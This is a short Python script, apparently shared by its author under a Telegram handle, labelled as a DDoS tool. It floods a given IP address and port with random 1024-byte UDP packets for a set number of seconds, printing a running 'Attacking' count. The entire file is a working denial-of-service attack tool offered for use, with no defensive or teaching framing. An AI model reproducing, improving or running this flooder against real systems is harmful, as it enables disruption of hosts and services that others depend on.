"""
#Written by 《ERFAN》
#t.me/ErfanMAfshar
Usage : ./Ddos <ip> <port> <second>
"""
import time,socket,random,sys

def usage():
    print("Usage: " + sys.argv[0] + " <ip> <port> <second>")

def flood(vip, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytee = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 0

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytee, (vip, vport))
        sent = sent + 1
        print("Attacking %s sent packages %s at the port %s "%(sent, vip, vport))

def main():
    print(len(sys.argv))
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()